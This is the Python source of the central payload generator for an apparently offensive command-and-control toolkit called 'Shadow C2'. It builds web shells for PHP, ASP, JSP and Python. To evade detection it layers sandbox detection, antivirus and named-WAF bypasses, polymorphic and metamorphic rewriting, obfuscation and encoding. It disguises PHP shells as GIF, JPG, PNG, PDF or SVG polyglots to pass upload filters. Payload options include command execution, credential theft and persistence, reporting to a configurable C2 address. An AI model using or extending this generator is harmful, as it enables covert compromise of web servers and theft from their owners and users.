#!/usr/bin/env python3
"""
Shadow C2 — Payload Generator Engine
Central orchestrator: template selection -> WAF bypass -> polymorphic ->
metamorphic -> obfuscation -> encoding chain -> polyglot wrapping.
Every generation produces a unique payload with different hash.
"""

import os
import random
import hashlib
import time
import json

from server.generator.polymorphic import PolymorphicEngine
from server.generator.metamorphic import MetamorphicEngine
from server.generator.obfuscator import Obfuscator
from server.generator.encoder import EncoderChain
from server.generator.waf_bypass import WAFBypass
from server.generator.av_bypass import AVBypass
from server.generator.sandbox_detect import SandboxDetector
from server.generator.polyglot import PolyglotGenerator
from server.generator.templates.php_raw import PHPRawTemplate
from server.generator.templates.asp_raw import ASPRawTemplate
from server.generator.templates.jsp_raw import JSPRawTemplate
from server.generator.templates.python_raw import PythonRawTemplate, HtaccessTemplate, UserIniTemplate
from server.config import PAYLOAD_OUTPUT_DIR


class PayloadGenerator:
    """
    Main payload generation engine.
    Orchestrates template selection, evasion techniques, obfuscation,
    encoding, and polyglot wrapping.
    """

    PAYLOAD_TYPES = {
        "php_raw": {"ext": ".php", "template": "php"},
        "php_gif": {"ext": ".php.gif", "template": "php", "polyglot": "gif"},
        "php_jpg": {"ext": ".php.jpg", "template": "php", "polyglot": "jpg"},
        "php_png": {"ext": ".php.png", "template": "php", "polyglot": "png"},
        "php_pdf": {"ext": ".php.pdf", "template": "php", "polyglot": "pdf"},
        "phtml": {"ext": ".phtml", "template": "php"},
        "php5": {"ext": ".php5", "template": "php"},
        "php7": {"ext": ".php7", "template": "php"},
        "pht": {"ext": ".pht", "template": "php"},
        "asp": {"ext": ".aspx", "template": "asp"},
        "jsp": {"ext": ".jsp", "template": "jsp"},
        "htaccess": {"ext": ".htaccess", "template": "htaccess"},
        "userini": {"ext": ".user.ini", "template": "userini"},
        "python": {"ext": ".py", "template": "python"},
        "svg": {"ext": ".svg", "template": "php", "polyglot": "svg"},
    }

    def __init__(self):
        self.polymorphic = PolymorphicEngine()
        self.metamorphic = MetamorphicEngine()
        self.obfuscator = Obfuscator()
        self.encoder = EncoderChain()
        self.waf_bypass = WAFBypass()
        self.av_bypass = AVBypass()
        self.sandbox_detect = SandboxDetector()
        self.polyglot = PolyglotGenerator()

        # Templates
        self.php_template = PHPRawTemplate()
        self.asp_template = ASPRawTemplate()
        self.jsp_template = JSPRawTemplate()
        self.python_template = PythonRawTemplate()
        self.htaccess_template = HtaccessTemplate()
        self.userini_template = UserIniTemplate()

    def generate(self, options: dict) -> dict:
        """
        Generate a payload based on options.

        options keys:
            payload_type: str (key from PAYLOAD_TYPES)
            c2_url: str
            encryption_key: str (auto-generated if empty)
            encoding_layers: list of encoder names, e.g. ['base64', 'xor', 'gzip']
            obfuscation_level: int (1-10)
            waf_targets: list of WAF names to bypass
            include_sandbox_detect: bool
            include_av_bypass: bool
            polyglot_format: str (gif/jpg/png/pdf/svg or None)
            features: list of enabled features (exec, files, creds, persist, selfdestruct)
            trigger_type: str (param/header/cookie/time/ip or None)

        Returns:
            {filename, content, sha256, size, metadata, content_type}
        """
        payload_type = options.get("payload_type", "php_raw")
        c2_url = options.get("c2_url", "https://c2.example.com:8443")
        encryption_key = options.get("encryption_key", "")
        encoding_layers = options.get("encoding_layers", ["base64"])
        obfuscation_level = options.get("obfuscation_level", 5)
        waf_targets = options.get("waf_targets", [])
        include_sandbox = options.get("include_sandbox_detect", False)
        include_av = options.get("include_av_bypass", False)
        polyglot_format = options.get("polyglot_format")
        features = options.get("features", ["exec", "files", "creds", "persist"])
        trigger_type = options.get("trigger_type")

        # Generate encryption key if not provided
        if not encryption_key:
            encryption_key = hashlib.md5(os.urandom(32)).hexdigest()

        # Get type config
        type_config = self.PAYLOAD_TYPES.get(payload_type, self.PAYLOAD_TYPES["php_raw"])
        template_type = type_config["template"]

        # --- Step 1: Generate base code from template ---
        if template_type == "php":
            code = self.php_template.generate(c2_url, encryption_key, features)
        elif template_type == "asp":
            code = self.asp_template.generate(c2_url, encryption_key)
        elif template_type == "jsp":
            code = self.jsp_template.generate(c2_url, encryption_key)
        elif template_type == "python":
            code = self.python_template.generate(c2_url, encryption_key)
        elif template_type == "htaccess":
            code = self.htaccess_template.generate()
            # htaccess and userini don't get obfuscated
            return self._finalize(code, payload_type, type_config, options)
        elif template_type == "userini":
            code = self.userini_template.generate()
            return self._finalize(code, payload_type, type_config, options)
        else:
            code = self.php_template.generate(c2_url, encryption_key, features)

        # Only apply PHP-specific transforms to PHP code
        if template_type != "php":
            return self._finalize(code, payload_type, type_config, options)

        # --- Step 2: Inject sandbox/VM detection ---
        if include_sandbox:
            sandbox_code = self.sandbox_detect.generate_all(
                include_sandbox=True,
                include_trigger=(trigger_type is not None),
                trigger_type=trigger_type or "param"
            )
            code = code.replace("<?php", "<?php\n" + sandbox_code, 1)

        # --- Step 3: Apply AV bypass techniques ---
        if include_av:
            code = self.av_bypass.apply_all(code)

        # --- Step 4: Apply WAF bypass techniques ---
        if waf_targets:
            code = self.waf_bypass.apply_for_waf(code, waf_targets)

        # --- Step 5: Polymorphic transformation ---
        code = self.polymorphic.apply_all(code, level=obfuscation_level)

        # --- Step 6: Metamorphic transformation ---
        if obfuscation_level >= 4:
            code = self.metamorphic.apply_all(code)

        # --- Step 7: Obfuscation ---
        code = self.obfuscator.apply_all(code, level=obfuscation_level)

        # --- Step 8: Encoding chain ---
        if encoding_layers:
            # Strip PHP tags for encoding, encoder re-adds them
            inner = code.strip()
            if inner.startswith("<?php"):
                inner = inner[5:].strip()
            if inner.endswith("?>"):
                inner = inner[:-2].strip()
            code = self.encoder.encode(inner, encoding_layers)

        # --- Step 9: Polyglot wrapping ---
        polyglot_fmt = polyglot_format or type_config.get("polyglot")
        if polyglot_fmt:
            # Strip PHP tags for embedding
            inner_code = code.strip()
            if inner_code.startswith("<?php"):
                inner_code = inner_code[5:].strip()
            if inner_code.endswith("?>"):
                inner_code = inner_code[:-2].strip()

            if polyglot_fmt == "gif":
                content = self.polyglot.generate_gif_php(inner_code)
            elif polyglot_fmt == "jpg":
                content = self.polyglot.generate_jpg_php(inner_code)
            elif polyglot_fmt == "png":
                content = self.polyglot.generate_png_php(inner_code)
            elif polyglot_fmt == "pdf":
                content = self.polyglot.generate_pdf_php(inner_code)
            elif polyglot_fmt == "svg":
                content = self.polyglot.generate_svg_php(inner_code)
                return self._finalize(content, payload_type, type_config, options)
            else:
                content = code.encode() if isinstance(code, str) else code

            return self._finalize_binary(content, payload_type, type_config, options)

        return self._finalize(code, payload_type, type_config, options)

    def _finalize(self, code: str, payload_type: str,
                  type_config: dict, options: dict) -> dict:
        """Finalize text payload: save, compute hash, return metadata."""
        content_bytes = code.encode("utf-8") if isinstance(code, str) else code
        sha256 = hashlib.sha256(content_bytes).hexdigest()

        # Generate filename
        timestamp = int(time.time())
        rand_suffix = hashlib.md5(os.urandom(8)).hexdigest()[:8]
        ext = type_config.get("ext", ".php")
        filename = f"payload_{timestamp}_{rand_suffix}{ext}"

        # Save to disk
        filepath = os.path.join(PAYLOAD_OUTPUT_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content_bytes)

        return {
            "filename": filename,
            "filepath": filepath,
            "content": code if isinstance(code, str) else code.decode("utf-8", errors="replace"),
            "sha256": sha256,
            "size": len(content_bytes),
            "content_type": "text/plain",
            "metadata": {
                "payload_type": payload_type,
                "c2_url": options.get("c2_url", ""),
                "encoding_layers": options.get("encoding_layers", []),
                "obfuscation_level": options.get("obfuscation_level", 5),
                "waf_targets": options.get("waf_targets", []),
                "sandbox_detect": options.get("include_sandbox_detect", False),
                "av_bypass": options.get("include_av_bypass", False),
                "generated_at": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            }
        }

    def _finalize_binary(self, content: bytes, payload_type: str,
                         type_config: dict, options: dict) -> dict:
        """Finalize binary payload (polyglot files)."""
        sha256 = hashlib.sha256(content).hexdigest()
        timestamp = int(time.time())
        rand_suffix = hashlib.md5(os.urandom(8)).hexdigest()[:8]
        ext = type_config.get("ext", ".php")
        filename = f"payload_{timestamp}_{rand_suffix}{ext}"

        filepath = os.path.join(PAYLOAD_OUTPUT_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content)

        content_type_map = {
            ".gif": "image/gif", ".jpg": "image/jpeg",
            ".png": "image/png", ".pdf": "application/pdf",
        }
        ct = "application/octet-stream"
        for k, v in content_type_map.items():
            if ext.endswith(k):
                ct = v
                break

        return {
            "filename": filename,
            "filepath": filepath,
            "content": f"[Binary polyglot: {len(content)} bytes]",
            "sha256": sha256,
            "size": len(content),
            "content_type": ct,
            "metadata": {
                "payload_type": payload_type,
                "polyglot_format": type_config.get("polyglot", ""),
                "c2_url": options.get("c2_url", ""),
                "generated_at": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
            }
        }

    def list_payload_types(self) -> list:
        """List available payload types."""
        return [{"type": k, "ext": v["ext"], "template": v["template"]}
                for k, v in self.PAYLOAD_TYPES.items()]

    def list_encoders(self) -> list:
        """List available encoders."""
        return self.encoder.AVAILABLE_ENCODERS

    def list_waf_bypasses(self) -> list:
        """List available WAF bypass targets."""
        return ["cloudflare", "modsecurity", "sucuri", "imperva",
                "aws_waf", "akamai", "generic"]
